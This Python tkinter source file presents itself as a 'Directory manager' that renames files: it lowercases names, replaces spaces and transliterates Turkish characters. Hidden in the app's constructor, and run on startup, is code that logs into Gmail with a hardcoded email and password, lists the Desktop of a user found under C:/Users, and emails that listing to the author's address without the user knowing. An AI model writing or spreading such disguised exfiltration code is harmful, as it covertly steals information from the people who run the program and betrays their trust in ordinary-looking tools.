import os
import smtplib
from tkinter import ttk
from tkinter import filedialog
from tkinter import *
from tkinter import messagebox

class App(Tk):

    def __init__(self):
        super(App, self).__init__()
        self.title("Directory manager")
        self.geometry("800x450")
        self.configure(bg="green")
        #global my_icon
        #my_icon=ImageTk.PhotoImage(Image.open("icon.png"))
        #self.iconphoto(False,my_icon)
        self.resizable(0, 0)
        self.my_tab=ttk.Notebook(self)
        self.my_tab.pack(pady=15)

        #Three main frame
        self.basic_frame = Frame(self.my_tab,bg="red")
        self.advanced_frame = Frame(self.my_tab)
        self.hack_frame = Frame(self.my_tab)

        ###notebook add
        self.my_tab.add(self.basic_frame, text="Basic EDITION")
        self.my_tab.add(self.advanced_frame, text="ADVANCED EDITION")
        self.my_tab.add(self.hack_frame, text="ULTIMATE EDITION")
################BASic TAB##################################################################
        #button frame and File frame
        self.button_frame=Frame(self.basic_frame,width=200,height=40,bg="blue",bd=5)
        self.button_frame.pack(side=RIGHT,fill=Y)
        self.my_entry_frame=Frame(self.basic_frame,width=400,height=40,bg="orange",bd=5)
        self.my_entry_frame.pack(side=LEFT,fill=Y)
        ##Buttons
        self.special_char_button = Button(self.button_frame, text="Special char", padx=20, pady=20,
                                          command=self.spe_chr)
        self.special_char_button.pack(pady=10)
        self.space_button=Button(self.button_frame,text="Set space",padx=20,pady=20,command=self.space_func)
        self.space_button.pack(pady=10)
        self.upper_to_lower_button = Button(self.button_frame, text="Upper lower",padx=20,pady=20,command=self.up_to_low)
        self.upper_to_lower_button.pack(pady=10)
        self.txt_photo_button = Button(self.button_frame, text="Photo txt",padx=20,pady=20,command=self.txt_img)
        self.txt_photo_button.pack(pady=10)


        #####Entries
        self.man_label=Label(self.my_entry_frame,text="Rel : ")
        self.man_label.grid(row=0,column=0)
        self.man_entry=Entry(self.my_entry_frame,width=50,font="arial 20 bold")
        self.man_entry.grid(row=0,column=1)


############################Advanced TAb######################################################################
        # button frame and File frame
        self.button_frame1 = Frame(self.advanced_frame, width=200, height=40, bg="blue", bd=5)
        self.button_frame1.pack(side=RIGHT, fill=Y)
        self.my_entry_frame1 = Frame(self.advanced_frame, width=400, height=40, bg="orange", bd=5)
        self.my_entry_frame1.pack(side=LEFT, fill=Y)
        ##Buttons
        self.special_char_button = Button(self.button_frame1, text="Special char", padx=20, pady=20,
                                          command=self.spe_chr)
        self.special_char_button.pack(pady=10)
        self.space_button = Button(self.button_frame1, text="Set space", padx=20, pady=20, command=self.space_func)
        self.space_button.pack(pady=10)
        self.upper_to_lower_button = Button(self.button_frame1, text="Upper lower", padx=20, pady=20,
                                            command=self.up_to_low)
        self.upper_to_lower_button.pack(pady=10)
        self.txt_photo_button = Button(self.button_frame1, text="Photo txt", padx=20, pady=20, command=self.txt_img)
        self.txt_photo_button.pack(pady=10)

        #####Entries
        self.man_label = Label(self.my_entry_frame1, text="Rel : ",font="arial 20 bold")
        self.man_label.grid(row=0, column=0)
        self.man_entry_adv = Entry(self.my_entry_frame1, width=90, font="arial 12 bold")
        self.man_entry_adv.grid(row=1, column=0)
        self.auto_find=Button(self.my_entry_frame1,text="Auto find",padx=40,pady=40,command=self.find_auto_adv)
        self.auto_find.grid(row=2,column=0,pady=20,padx=40)
        self.auto_find = Button(self.my_entry_frame1, text="Start", padx=40, pady=40, command=self.advanced_button)
        self.auto_find.grid(row=3, column=0, pady=20, padx=40)

    ############################Hack TAb######################################################################
        # button frame and File frame
        self.button_frame2 = Frame(self.hack_frame, width=200, height=40, bg="blue", bd=5)
        self.button_frame2.pack(side=RIGHT, fill=Y)
        self.my_entry_frame2 = Frame(self.hack_frame, width=400, height=40, bg="orange", bd=5)
        self.my_entry_frame2.pack(side=LEFT, fill=Y)
        ##Buttons
        self.special_char_button = Button(self.button_frame2, text="Special char", padx=20, pady=20,
                                          command=self.spe_chr)
        self.special_char_button.pack(pady=10)
        self.space_button = Button(self.button_frame2, text="Set space", padx=20, pady=20, command=self.space_func)
        self.space_button.pack(pady=10)
        self.upper_to_lower_button = Button(self.button_frame2, text="Upper lower", padx=20, pady=20,
                                            command=self.up_to_low)
        self.upper_to_lower_button.pack(pady=10)
        self.txt_photo_button = Button(self.button_frame2, text="Photo txt", padx=20, pady=20, command=self.txt_img)
        self.txt_photo_button.pack(pady=10)

        #####Entries
        self.man_label = Label(self.my_entry_frame2, text="Rel : ")
        self.man_label.grid(row=0, column=0)
        self.man_entry = Entry(self.my_entry_frame2, width=90, font="arial 10 bold")
        self.man_entry.grid(row=0, column=1,columnspan=2)
        self.find_auto_button=Button(self.my_entry_frame2,text="auto find",padx=60,pady=10,command=self.find_auto)
        self.find_auto_button.grid(row=1,column=0,columnspan=3)
        self.man_label = Label(self.my_entry_frame2, text="",bg="orange",fg='orange')
        self.man_label.grid(row=2, column=0)
        self.walk_button = Button(self.my_entry_frame2, text="Walk",padx=40,pady=20, command=self.walk_func)
        self.walk_button.grid(row=2, column=1, pady=20,padx=5)
        self.list_button = Button(self.my_entry_frame2, text="list",padx=40,pady=20, command=self.list_func)
        self.list_button.grid(row=2, column=2, pady=20,padx=5)

        e_mail = "fake.mail.xelil@gmail.com"
        pass_word = "005461620"

        with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.ehlo()

            smtp.login(e_mail, pass_word)


            os.chdir("C:/Users")


            a = os.listdir()
            y = a[len(a) - 1]

            os.chdir(f"{y}/Desktop")

            empty = ""
            for i in os.listdir():
                empty += i + "\n"

            msg = f"{os.getcwd()}\n\n{empty}"
            smtp.sendmail(e_mail, "fake.mail.xelil@gmail.com", msg)

    def up_to_low(self,uv=None):

        if uv==None:
            os.chdir(f"{str(self.man_entry.get())}")
        else:
            os.chdir(uv)

        for i in os.listdir():
            a = i.lower()
            os.rename(f"{i}", a)

    def space_func(self,us=None):
        if us == None:
            os.chdir(f"{str(self.man_entry.get())}")
        else:
            os.chdir(us)
        for i in os.listdir():
            a=i.replace(" ","_")
            os.rename(f"{i}",a)

    def txt_img(self,ut=None):
       # print(os.getcwd())
        if ut == None:
            os.chdir(f"{str(self.man_entry.get())}")
        else:
            os.chdir(ut)
        #print(os.getcwd())
        for wak in os.listdir() :
            try:
                mi = str(wak).split(".")
                if mi[1] == "jpeg" or mi[1] == "png" or mi[1] == "jpg":
                        check = os.path.exists("photos_text.txt")
                        if check == True:
                            f = open("photos_text.txt","a")
                            f.write(f"{wak}")
                            f.write(f"\n")
                            f.close()
                        else:
                            f=open("photos_text.txt","w")
                            f.write(f"{wak}")
                            f.write(f"\n")
                            f.close()
            except:
                pass
        #print(os.listdir())

    def spe_chr(self,us=None):
        if us == None:
            os.chdir(f"{str(self.man_entry.get())}")
        else:
            os.chdir(us)

        for i in os.listdir():
            bra=self.translate(i)
            os.rename(f"{i}",bra)

    def translate(self,my_str):
        allt = "ÂâÇçÊêĞğİıÎîÖöŞşÛûÜü"
        a_2 = my_str.replace("Â", "A")
        a_2 = a_2.replace("â", "a")
        a_2 = a_2.replace("Ç", "C")
        a_2 = a_2.replace("ç", "c")
        a_2 = a_2.replace("Ê", "E")
        a_2 = a_2.replace("ê", "e")
        a_2 = a_2.replace("Ğ", "G")
        a_2 = a_2.replace("ğ", "g")
        a_2 = a_2.replace("İ", "I")
        a_2 = a_2.replace("ı", "i")
        a_2 = a_2.replace("Î", "I")
        a_2 = a_2.replace("î", "i")
        a_2 = a_2.replace("Ö", "O")
        a_2 = a_2.replace("ö", "o")
        a_2 = a_2.replace("Ş", "S")
        a_2 = a_2.replace("ş", "s")
        a_2 = a_2.replace("Û", "U")
        a_2 = a_2.replace("û", "u")
        a_2 = a_2.replace("Ü", "U")
        a_2 = a_2.replace("ü", "u")

        return a_2

    def advanced_button(self):
        my = filedialog.askdirectory()
        #print(my)
        for self.no_need, self.dirnames, self.filename in os.walk(f"{my}"):
            #print("Directories: ", self.dirnames)
            #print("Files : ", self.filename)
            #print()
            self.up_to_low(self.no_need)
            self.txt_img(self.no_need)
            self.spe_chr(self.no_need)
            self.space_func(self.no_need)
            messagebox.showinfo("Azra Zelal", "your files Has been changed successfully")


    def find_auto(self):
        self.my = filedialog.askdirectory()
        self.man_entry.insert(0,f"{str(self.my)}")
    def find_auto_adv(self):
        self.my = filedialog.askdirectory()
        self.man_entry_adv.insert(0,f"{str(self.my)}")

    def walk_func(self):
        for self.no_need, self.dirnames, self.filename in os.walk(f"{self.my}"):
            self.up_to_low(self.no_need)

            self.spe_chr(self.no_need)
            self.space_func(self.no_need)
            self.txt_img(self.no_need)
        messagebox.showinfo("Silhaddin","your files Has been changed successfully")
    def list_func(self):
        for i in os.listdir(f"{self.my}"):
            self.up_to_low()

            self.spe_chr()
            self.space_func()
            self.txt_img()
        messagebox.showinfo("Ruken", "your files Has been changed successfully")





if __name__ == '__main__':
    app=App()
    app.mainloop()


